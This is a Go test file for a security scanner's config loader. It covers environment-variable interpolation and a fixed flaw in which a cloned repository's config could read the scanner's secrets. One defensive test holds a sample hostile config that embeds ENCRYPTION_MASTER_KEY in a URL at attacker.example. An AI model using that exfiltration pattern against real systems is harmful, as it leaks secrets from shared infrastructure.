package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The whole point: a credential reaches the scan without being written into a
// committed file.
func TestAValueComesFromTheEnvironment(t *testing.T) {
	t.Setenv("DG_TEST_TOKEN", "s3cr3t-value")

	got, err := interpolateOS([]byte(`headers:
  Authorization: "Bearer ${DG_TEST_TOKEN}"
`))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(got), "Bearer s3cr3t-value") {
		t.Errorf("interpolated to %q", got)
	}
}

// An unset variable must not become an empty string. "Authorization: Bearer "
// is a header that is present, wrong, and indistinguishable from an
// authenticated scan until somebody wonders why everything behind the login
// looks clean.
func TestAnUnsetVariableIsRefusedRatherThanEmptied(t *testing.T) {
	os.Unsetenv("DG_TEST_ABSENT")

	_, err := interpolateOS([]byte(`Authorization: "Bearer ${DG_TEST_ABSENT}"`))
	if err == nil {
		t.Fatal("an unset variable must not silently become an empty string")
	}
	if !strings.Contains(err.Error(), "DG_TEST_ABSENT") {
		t.Errorf("the error must name the variable; got %v", err)
	}
	// And it must say how to make it optional, or the only way out is to guess.
	if !strings.Contains(err.Error(), ":-") {
		t.Errorf("the error should point at the optional form; got %v", err)
	}
}

// An empty value is treated as unset, because an exported-but-empty variable is
// the overwhelmingly common shape of "the secret did not make it into CI".
func TestAnEmptyVariableIsTreatedAsUnset(t *testing.T) {
	t.Setenv("DG_TEST_EMPTY", "")

	if _, err := interpolateOS([]byte(`x: "${DG_TEST_EMPTY}"`)); err == nil {
		t.Error("an exported-but-empty variable is how a secret usually fails to arrive")
	}

	got, err := interpolateOS([]byte(`x: "${DG_TEST_EMPTY:-fallback}"`))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(got), "fallback") {
		t.Errorf("a default should apply to an empty value; got %q", got)
	}
}

func TestADefaultMayItselfBeEmpty(t *testing.T) {
	os.Unsetenv("DG_TEST_OPTIONAL")

	got, err := interpolateOS([]byte(`x: "${DG_TEST_OPTIONAL:-}"`))
	if err != nil {
		t.Fatalf("an explicitly optional value must be allowed: %v", err)
	}
	if strings.Contains(string(got), "$") {
		t.Errorf("the reference should be gone; got %q", got)
	}
}

// A config that cannot express its own syntax has a trap in it: an ignore
// pattern or a policy message may legitimately contain "${".
func TestALiteralDollarBraceCanBeWritten(t *testing.T) {
	got, err := interpolateOS([]byte(`message: "cost is $${NOT_A_VARIABLE}"`))
	if err != nil {
		t.Fatalf("an escaped reference must not be resolved: %v", err)
	}
	if !strings.Contains(string(got), "${NOT_A_VARIABLE}") {
		t.Errorf("escaped form did not survive; got %q", got)
	}
}

// Every missing variable at once. Finding them one deploy at a time is the
// thing that makes a config change take an afternoon.
func TestEveryMissingVariableIsNamedTogether(t *testing.T) {
	os.Unsetenv("DG_TEST_A")
	os.Unsetenv("DG_TEST_B")

	_, err := interpolateOS([]byte("a: ${DG_TEST_A}\nb: ${DG_TEST_B}\n"))
	if err == nil {
		t.Fatal("expected an error")
	}
	for _, want := range []string{"DG_TEST_A", "DG_TEST_B"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error should name %s; got %v", want, err)
		}
	}
}

// End to end through the real loader.
func TestACredentialReachesTheConfigWithoutBeingCommitted(t *testing.T) {
	t.Setenv("DG_TEST_DAST_TOKEN", "abc123")

	dir := t.TempDir()
	path := filepath.Join(dir, ".dragon.yaml")
	if err := os.WriteFile(path, []byte(`version: dragonguard/v1
project: example
dast:
  headers:
    Authorization: "Bearer ${DG_TEST_DAST_TOKEN}"
`), 0o600); err != nil {
		t.Fatal(err)
	}

	cfg, err := Load(path, dir)
	if err != nil {
		t.Fatal(err)
	}
	if got := cfg.DAST.Headers["Authorization"]; got != "Bearer abc123" {
		t.Errorf("header = %q, want the interpolated credential", got)
	}

	// The file on disk still holds only the reference.
	onDisk, _ := os.ReadFile(path)
	if strings.Contains(string(onDisk), "abc123") {
		t.Error("the secret was written back to the file")
	}
}

// interpolateOS is the process-environment behaviour the CLI keeps.
func interpolateOS(raw []byte) ([]byte, error) { return interpolate(raw, OSEnv) }

// The vulnerability this parameter exists to close.
//
// The hosted scanner clones a repository it did not write and reads the
// .dragon.yaml inside it. Resolving ${VAR} against its own environment handed
// that repository a read primitive over every secret the scanner holds -- and
// the same file configures where DAST traffic goes, so the two compose into
// exfiltration with no exploit required.
func TestAServerSuppliesTheEnvironmentAndNotTheProcess(t *testing.T) {
	t.Setenv("ENCRYPTION_MASTER_KEY", "the-key-that-decrypts-every-tenant")

	hostile := []byte(`engines:
  zap:
    rules: ["https://attacker.example/${ENCRYPTION_MASTER_KEY}"]
`)

	// What the platform now does: resolve nothing it was not given.
	if _, err := interpolate(hostile, NoEnv); err == nil {
		t.Fatal("an unsupplied variable must fail rather than resolve")
	}

	// And a lookup that is simply forgotten must not fall back to the process.
	got, err := interpolate(hostile, nil)
	if err == nil {
		t.Fatal("a nil lookup must resolve nothing, not everything")
	}
	if got != nil {
		t.Error("nothing should be returned when interpolation failed")
	}

	// A scoped source answers only for what it holds.
	scoped := func(name string) (string, bool) {
		if name == "PROJECT_DAST_TOKEN" {
			return "scoped-value", true
		}
		return "", false
	}
	out, err := interpolate([]byte(`h: "Bearer ${PROJECT_DAST_TOKEN}"`), scoped)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(out), "scoped-value") {
		t.Errorf("a scoped variable should resolve; got %q", out)
	}
	if _, err := interpolate([]byte(`h: "${ENCRYPTION_MASTER_KEY}"`), scoped); err == nil {
		t.Error("a scoped source must not answer for a variable it does not hold")
	}
}

// LoadWithEnv is the door the platform uses; it must not reach the process
// environment even when the variable exists there.
func TestLoadWithEnvCannotReachTheProcessEnvironment(t *testing.T) {
	t.Setenv("JWT_SECRET", "leak-me")

	dir := t.TempDir()
	path := filepath.Join(dir, ".dragon.yaml")
	if err := os.WriteFile(path, []byte(`version: dragonguard/v1
project: hostile
dast:
  headers:
    X-Data: "${JWT_SECRET}"
`), 0o600); err != nil {
		t.Fatal(err)
	}

	if _, err := LoadWithEnv(path, dir, NoEnv); err == nil {
		t.Fatal("a repository must not be able to read the scanner's environment")
	}

	// The CLI door still works, because there the environment is the caller's.
	cfg, err := Load(path, dir)
	if err != nil {
		t.Fatalf("the command line keeps its behaviour: %v", err)
	}
	if cfg.DAST.Headers["X-Data"] != "leak-me" {
		t.Error("Load should still resolve against the process environment")
	}
}
